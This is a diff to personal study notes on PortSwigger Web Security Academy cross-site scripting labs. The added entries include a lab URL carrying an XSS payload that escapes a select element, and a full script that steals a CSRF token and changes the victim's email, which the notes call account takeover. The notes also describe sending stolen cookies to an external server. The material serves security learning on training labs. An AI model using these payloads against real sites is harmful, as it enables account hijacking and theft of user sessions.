@@ -13,6 +13,7 @@
 
 ## Practitioner
 - DOM XSS in document.write sink using source location.search inside a select element
+    - Inject malicious javascript into the storeId query parameter to escape from the string. URL: https://0ac0003b03854101851caa5f00c50027.web-security-academy.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 - Reflected DOM XSS
 - Stored DOM XSS
@@ -31,4 +32,16 @@
     - Take advantage of the template literal to use string interpolation. Payload: ${alert()}
 - Exploiting cross-site scripting to steal cookies
     - Uses the Burp Collaborator feature (professional) as an external server to send the cookie to. You can take advantage of the fact that HTML tags are not escaped to inject a script into the comment input.
-    
+- Exploiting XSS to bypass CSRF defenses
+    - Take advantage of the lack of input validation in the comment input to inject a script which steals the csrf token and includes it in a request to change the user's email when the page loads --> account takeover. Payload: \<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
